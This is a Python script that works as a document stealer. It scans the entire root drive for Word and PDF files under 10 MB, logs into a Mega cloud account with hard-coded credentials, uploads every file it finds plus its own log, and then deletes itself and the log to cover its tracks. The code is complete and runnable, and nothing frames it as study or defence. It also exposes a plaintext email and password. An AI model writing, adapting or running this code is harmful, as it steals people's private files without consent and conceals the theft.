import os
import socket
import time
import logging
from mega import Mega

MAX_RETRIES = 20
RETRY_WAIT_SECONDS = 300

EMAIL = "loorissnoual@gmail.com"
PASSWORD = "Like2023"

# Configure logging
LOG_FILE_NAME = 'script_log.txt'
logging.basicConfig(filename=LOG_FILE_NAME, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


def log_info(message):
    """Log information."""
    logging.info(message)
    print(message)


def log_error(message):
    """Log errors."""
    logging.error(message)
    print(message)


def find_files_under_size(folder_path, max_size_bytes, allowed_extensions):
    found_files = []
    retry_count = 0

    while retry_count < MAX_RETRIES:
        try:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file.lower().endswith(allowed_extensions) and os.path.getsize(file_path) < max_size_bytes:
                        found_files.append(file_path)
            break
        except Exception as e:
            log_error(f"An error occurred while searching for files: {e}")
            retry_count += 1
            if retry_count < MAX_RETRIES:
                log_info(f"Retrying... Attempt {retry_count}")
            else:
                log_error("Max retry attempts reached. Skipping file search.")

    return found_files


def check_internet_connection():
    try:
        socket.create_connection(('8.8.8.8', 53), timeout=2)
        return True
    except Exception:
        return False


def upload_files_to_mega(mega, file_paths, target_folder_name):
    try:
        target_folder = mega.find(target_folder_name)
        if not target_folder:
            log_error(f"Mega folder '{target_folder_name}' not found.")
            return

        for file_path in file_paths:
            retry_count = 0
            while retry_count < MAX_RETRIES:
                try:
                    mega.upload(file_path, target_folder[0])
                    log_info(f"Uploaded {os.path.basename(file_path)} to Mega successfully.")
                    break
                except Exception as e:
                    retry_count += 1
                    log_error(f"Upload attempt {retry_count} failed: {str(e)}")
                    if retry_count < MAX_RETRIES:
                        log_info(f"Retrying in {RETRY_WAIT_SECONDS} seconds...")
                        time.sleep(RETRY_WAIT_SECONDS)
                    else:
                        log_error("Max retry attempts reached. Skipping upload for this file.")
    except Exception as e:
        log_error(f"An error occurred during file upload to Mega: {e}")


def main():
    log_info("Script started.")

    try:
        # Get the main drive path
        main_drive_path = os.path.abspath(os.sep)

        # Set the maximum file size and allowed extensions
        max_file_size = 10 * 1024 * 1024
        allowed_extensions = ('.docx', '.doc', '.pdf')

        # Find files under the specified size and extensions in the main drive
        found_files_list = find_files_under_size(main_drive_path, max_file_size, allowed_extensions)

        log_info("Files found:")
        for found_file in found_files_list:
            log_info(f"- {found_file}")

        if not check_internet_connection():
            log_info("No internet connectivity. Waiting indefinitely.")
            while not check_internet_connection():
                time.sleep(RETRY_WAIT_SECONDS)
            log_info("Internet connectivity restored.")

        # Login to Mega
        try:
            mega = Mega()
            m = mega.login(EMAIL, PASSWORD)
            if m is None:
                log_error("Failed to login to Mega. Aborting.")
                return
        except Exception as e:
            log_error(f"An error occurred during Mega login: {e}")
            return

        # Specify the target Mega folder
        target_folder_name = 'Documents'

        # Upload files
        upload_files_to_mega(m, found_files_list, target_folder_name)

        # Wait for 3 seconds before sending the log file
        time.sleep(3)

        # Upload the log file to Mega
        try:
            mega.upload(LOG_FILE_NAME, target_folder_name)
            log_info("Uploaded log file to Mega successfully.")
        except Exception as e:
            log_error(f"An error occurred while uploading the log file to Mega: {e}")

    except Exception as e:
        log_error(f"An error occurred: {e}")

    # Auto destroy the script (delete the script file and log file)
    script_file_path = os.path.abspath(__file__)
    try:
        os.remove(script_file_path)
        log_info("Script file deleted successfully.")
    except Exception as e:
        log_error(f"An error occurred while deleting the script file: {e}")

    try:
        os.remove(LOG_FILE_NAME)
        log_info("Log file deleted successfully.")
    except Exception as e:
        log_error(f"An error occurred while deleting the log file: {e}")

    log_info("Script completed.")


if __name__ == "__main__":
    main()
